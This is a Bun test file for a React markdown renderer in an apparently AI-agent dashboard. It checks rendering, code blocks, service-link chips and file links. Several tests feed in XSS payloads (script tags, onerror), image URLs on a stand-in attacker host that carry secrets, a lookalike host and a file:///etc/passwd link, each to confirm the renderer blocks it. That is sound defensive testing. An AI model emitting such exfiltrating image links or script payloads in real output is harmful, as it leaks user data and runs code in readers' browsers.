import { expect, test } from "bun:test";
import { renderToStaticMarkup } from "react-dom/server";
import type { UserTodo, UserTodoList } from "../../src/user-todos-shared";
import { loadGrammars } from "../code-highlight";
import { DashboardActionsContext, type DashboardActions, UserTodosContext } from "./dashboard-context";
import { FileBaseContext } from "./file-link";
import { AGENT_PRESET, GITHUB_PRESET, loadRawHtml, MessageMarkdown, PROMPT_PRESET } from "./message-markdown";

// A static render reads the grammars and the raw HTML plugins as they stand, so they load first, as in a page that showed code and GitHub text before.
await Promise.all([loadGrammars(), loadRawHtml()]);

test("messages render GFM and refuse executable markup", () => {
	const html = renderToStaticMarkup(
		<MessageMarkdown text={'# Report\n\n- [x] done\n\n| Key | Value |\n| --- | --- |\n| answer | 42 |\n\n```ts\nconst answer = 42\n```\n\n[link](https://example.com) <script>alert(1)</script>'} />,
	);
	expect(html).toContain("<h1>Report</h1>");
	expect(html).toContain('type="checkbox" disabled="" checked=""');
	expect(html).toContain("<table>");
	expect(html).toContain("hljs-keyword");
	expect(html).toContain('target="_blank" rel="noopener noreferrer"');
	expect(html).not.toContain("<script>");
	expect(html).not.toContain('node="[object Object]"');
});

test("service links keep their titles and icons without displaying bare URLs", () => {
	const destinations = [
		["https://linear.app/team/issue/ENG-42/fix-login", "ENG-42"],
		["https://github.com/org/repo/pull/42", "org/repo #42"],
		["https://app.graphite.com/github/pr/org/repo/42", "org/repo #42"],
		["https://team.slack.com/archives/C123/p123", "Slack message"],
	];
	for (const github of [false, true]) {
		for (const [url, label] of destinations) {
			const bare = renderToStaticMarkup(<MessageMarkdown preset={github ? GITHUB_PRESET : AGENT_PRESET} text={url!} />);
			expect(bare).toContain(`href="${url}"`);
			expect(bare.replace(/<[^>]*>/g, "")).toBe(label!);
			expect(bare).toContain('aria-hidden="true"');
			expect(bare).not.toContain(`>${url}<`);
			const titled = renderToStaticMarkup(<MessageMarkdown preset={github ? GITHUB_PRESET : AGENT_PRESET} text={`[Fix **login**](${url})`} />);
			expect(titled.replace(/<[^>]*>/g, "")).toBe("Fix login");
			expect(titled).toContain('aria-hidden="true"');
		}
	}
});

test("lookalike hosts and ordinary links keep their original labels without service icons", () => {
	for (const url of ["https://github.com.evil.example/org/repo", "https://not-slack.com/archives/C1/p1", "https://example.com"]) {
		const html = renderToStaticMarkup(<MessageMarkdown text={url} />);
		expect(html.replace(/<[^>]*>/g, "")).toBe(url);
		expect(html).not.toContain("<svg");
	}
});

test("an ordinary link loads nothing from its host, so a hostname that carries data reaches no one until clicked", () => {
	const html = renderToStaticMarkup(<MessageMarkdown text="See https://c2VjcmV0.attacker.example/ and [Private report](https://user:secret@example.com/private?token=sensitive)" />);
	expect(html).not.toContain("<img");
	expect(html).toContain('<span class="font-semibold underline">Private report</span>');
});

test("unfinished streaming fences remain code blocks", () => {
	const html = renderToStaticMarkup(<MessageMarkdown text={"Before\n\n```ts\nconst answer = 42"} />);
	expect(html).toContain('data-slot="code-block-content"');
	expect(html).toContain("hljs-keyword");
	expect(html).toContain("answer");
});

test("a fence titles its code block with its language, colors it line by line, and offers a copy button", () => {
	const html = renderToStaticMarkup(<MessageMarkdown text={"```tsx\nconst a = 1\n\nconst b = 2\n```"} />);
	expect(html).toMatch(/data-slot="code-block-title"[^>]*>tsx</);
	expect(html.match(/data-slot="code-block-line"/g)).toHaveLength(3);
	expect(html).toContain('<span class="hljs-keyword">const</span>');
	expect(html).toContain('aria-label="Copy"');

	const plain = renderToStaticMarkup(<MessageMarkdown text={"```\nconst a = 1\n```"} />);
	expect(plain).not.toContain('data-slot="code-block-header"');
	expect(plain).not.toContain("hljs");
	expect(plain).toContain('aria-label="Copy"');
});

test("GitHub text renders the HTML GitHub allows, hides comments, and still refuses executable markup", () => {
	const html = renderToStaticMarkup(
		<MessageMarkdown
			preset={GITHUB_PRESET}
			text={'<!-- CURSOR_SUMMARY -->\n<details><summary>More</summary>\n\nHidden **bold**\n\n</details>\n\n<img src="x" onerror="alert(1)"> <script>alert(1)</script>\n\n```ts\nconst answer = 42\n```'}
		/>,
	);
	expect(html).toContain("<details><summary>More</summary>");
	expect(html).toContain("<strong>bold</strong>");
	expect(html).toContain("hljs-keyword");
	expect(html).not.toContain("CURSOR_SUMMARY");
	expect(html).not.toContain("onerror");
	expect(html).not.toContain("<script>");
});

test("agent text links remote images rather than fetching them, but can show inline data images", () => {
	const html = renderToStaticMarkup(
		<MessageMarkdown text={'![secret](https://attacker.example/leak?q=key) ![logo](data:image/png;base64,aGVsbG8=)'} />,
	);
	expect(html).not.toContain('<img src="https://attacker.example');
	expect(html).toContain('<a href="https://attacker.example/leak?q=key"');
	expect(html).toContain('<img src="data:image/png;base64,aGVsbG8="');
});

test("GitHub text shows avatars, loads uploads through this server, and links other image URLs", () => {
	const html = renderToStaticMarkup(
		<MessageMarkdown preset={GITHUB_PRESET} text={'![avatar](https://avatars.githubusercontent.com/u/1?v=4) <img src="https://github.com/user-attachments/assets/123" alt="attachment"> ![other](https://attacker.example/leak)'} />,
	);
	expect(html).toContain('<img src="https://avatars.githubusercontent.com/u/1?v=4"');
	expect(html).toContain('<img src="/api/github-media?url=https%3A%2F%2Fgithub.com%2Fuser-attachments%2Fassets%2F123" alt="attachment"');
	expect(html).not.toContain('<img src="https://attacker.example');
	expect(html).toContain('<a href="https://attacker.example/leak"');
});

const fileLinks = (text: string, base: string | null): { html: string; count: number } => {
	const html = renderToStaticMarkup(
		<DashboardActionsContext.Provider value={{ openFile: () => {} } as unknown as DashboardActions}>
			<FileBaseContext.Provider value={base}>
				<MessageMarkdown text={text} />
			</FileBaseContext.Provider>
		</DashboardActionsContext.Provider>,
	);
	return { html, count: html.match(/class="file-link"/g)?.length ?? 0 };
};

test("agent text opens file paths in the file dialog, not web addresses or other files", () => {
	const { html, count } = fileLinks(
		"Wrote /tmp/omp-token-decision.tsv and `docs/usage.md:12`, see [plan](file:///tmp/plan.md), https://example.com/readme.md, `src/app.ts`, /tmp/report.pdf, and /tmp/shot.png.",
		"/repo",
	);
	expect(count).toBe(4);
	expect(html).toContain('<a href="https://example.com/readme.md"');
	expect(html).toContain("<code>src/app.ts</code>");
});

test("agent text shows the images and videos it names under it, each once, but for one it already shows in place", () => {
	const { html } = fileLinks("Before `tmp/a.png`, after /tmp/demo.mp4, again `tmp/a.png`.\n\n![b](shots/b.webp) and `shots/b.webp`\n\n```\n/tmp/c.png\n```", "/repo");
	const src = (path: string) => `/api/media?${new URLSearchParams({ path })}`.replaceAll("&", "&amp;");
	expect(html.match(/<figure[^>]*>.*<\/figure>/)?.[0].match(/src="[^"]+"/g)).toEqual([`src="${src("/repo/tmp/a.png")}"`, `src="${src("/tmp/demo.mp4")}"`]);
	expect(html).toContain(`<img src="${src("/repo/shots/b.webp")}" alt="b"`);
	expect(html).not.toContain("c.png&quot;");
	expect(html).not.toContain(src("/tmp/c.png"));
});

test("a remote image in agent text stays a link even with a media extension", () => {
	const { html } = fileLinks("![x](https://attacker.example/x.png)", "/repo");
	expect(html).not.toContain("<img");
	expect(html).not.toContain("<figure");
});

test("a relative file path opens only where a session directory resolves it, and code blocks stay code", () => {
	expect(fileLinks("`docs/usage.md` and ~/notes.md", null).count).toBe(1);
	expect(fileLinks("```\n/tmp/notes.md\n```", "/repo").count).toBe(0);
});

test("a file link whose escapes do not decode drops its address instead of throwing, and text from GitHub keeps no file path", () => {
	const broken = fileLinks("[x](file:///%E0) and [plan](file:///tmp/plan.md)", "/repo");
	expect(broken.count).toBe(1);
	expect(broken.html).toContain(">x</a>");
	expect(broken.html).not.toContain("%E0");
	const github = renderToStaticMarkup(<MessageMarkdown preset={GITHUB_PRESET} text="[passwd](file:///etc/passwd)" />);
	expect(github).not.toContain("/etc/passwd");
});

test("a sent prompt draws its references as chips that open here, and code stays code", () => {
	const todo: UserTodo = { id: "t1", text: "Tidy", body: "", status: "todo", priority: 0, assignee: null, doneAt: null, due: null, createdAt: null, categoryId: "work", workspace: null, children: [], links: [], addedBy: null };
	const prompt = (todos: UserTodoList | null) =>
		renderToStaticMarkup(
			<UserTodosContext.Provider value={todos}>
				<MessageMarkdown
					preset={PROMPT_PRESET}
					text={
						"/skill:ship check @web/app.tsx for [ENG-1 Fix it](https://linear.app/a/issue/ENG-1/fix) and [acme/web#7 Go](https://github.com/acme/web/pull/7), not `@web/x.ts`, then **todo \"Tidy\" (id t1)** after omp session \"Old\" (id s1)"
					}
				/>
			</UserTodosContext.Provider>,
		);
	const html = prompt({ categories: [], todos: [todo], archive: [] });
	expect(html.match(/data-chip="([\w-]+)"/g)).toEqual(['data-chip="skill"', 'data-chip="file"', 'data-chip="ticket"', 'data-chip="pull-request"', 'data-chip="todo"', 'data-chip="session"']);
	expect(html.match(/href="[^"]*"/g)).toEqual(['href="#tickets/ENG-1"', 'href="#pull-requests/acme/web/7"', 'href="#todo/work?open=t1"', 'href="#session/s1"']);
	expect(html).not.toContain("_blank");
	expect(prompt({ categories: [], todos: [], archive: [todo] })).toContain('href="#todo/archive?open=t1"');
	for (const unknown of [null, { categories: [], todos: [], archive: [] }]) expect(prompt(unknown)).not.toContain("#todo");
	expect(html).toContain("<code>@web/x.ts</code>");
	expect(html).not.toContain("/skill:ship check");
});
